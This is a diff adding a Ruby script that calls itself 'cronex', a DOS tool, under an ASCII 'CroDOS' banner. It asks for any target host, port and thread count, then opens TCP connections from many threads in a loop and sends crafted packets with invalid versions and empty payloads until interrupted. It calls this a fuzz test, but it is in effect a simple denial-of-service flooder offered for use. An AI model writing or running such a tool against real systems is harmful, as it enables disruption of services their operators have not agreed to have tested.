@@ -1,0 +1,117 @@
+#!/usr/bin/env ruby
+require 'socket'
+
+puts "Welcome to cronex!!! a DOS tool!!!"
+
+BANNER = <<~ASCII
+                   ________   ________    _________
+  ___________  ____\______ \  \_____  \  /   _____/
+_/ ___\_  __ \/  _ \|    |  \  /   |   \ \_____  \ 
+\  \___|  | \(  <_> )    `   \/    |    \/        \
+ \___  >__|   \____/_______  /\_______  /_______  /
+     \/                    \/         \/        \/ 
+          CroDOS
+ASCII
+
+puts "---------------------------------------"
+puts "---------------------------------------"
+puts "---------------------------------------"
+puts BANNER
+
+print "target host: "
+TARGET_HOST = gets.chomp
+
+print "target port: "
+TARGET_PORT = gets.chomp.to_i
+
+print "threads: "
+THREAD_COUNT = gets.chomp.to_i
+
+puts "Starting fuzz test with #{THREAD_COUNT} threads..."
+puts "Press CTRL+C to stop."
+
+# ---- Stop flag ----
+stop = false
+trap("INT") do
+  puts "\nStopping..."
+  stop = true
+end
+
+# ---- Packet ----
+class Packet
+  attr_accessor :version, :type, :payload
+
+  def initialize(version: 1, type: 1, payload: "hello")
+    @version = version
+    @type = type
+    @payload = payload
+  end
+
+  def length
+    @payload.bytesize
+  end
+
+  def encode
+    [
+      @version & 0xff,
+      @type & 0xff,
+      (length >> 8) & 0xff,
+      length & 0xff
+    ].pack("C C C C") + @payload
+  end
+end
+
+# ---- Mutations ----
+module Mutations
+  def self.list(base)
+    {
+      "baseline" => base,
+      "invalid_version" => Packet.new(version: 255, type: base.type, payload: base.payload),
+      "empty_payload" => Packet.new(version: base.version, type: base.type, payload: "")
+    }
+  end
+end
+
+# ---- Sender ----
+class Sender
+  def self.send_packet(packet)
+    socket = TCPSocket.new(TARGET_HOST, TARGET_PORT)
+    socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [2, 0].pack("l_2"))
+
+    socket.write(packet.encode)
+    response = socket.readpartial(1024) rescue "(no response)"
+
+    socket.close
+    response
+  rescue => e
+    "error: #{e.message}"
+  end
+end
+
+# ---- Setup ----
+baseline = Packet.new
+tests = Mutations.list(baseline)
+
+threads = []
+
+# ---- Threads ----
+THREAD_COUNT.times do |i|
+  threads << Thread.new do
+    while !stop
+      tests.each do |name, pkt|
+        break if stop
+
+        response = Sender.send_packet(pkt)
+        puts "[T#{i}] #{name} => #{response.inspect}"
+
+        sleep(0.01) # small throttle so it doesn't overwhelm system
+      end
+    end
+
+    puts "Thread #{i} stopped"
+  end
+end
+
+threads.each(&:join)
+
+puts "All threads stopped."
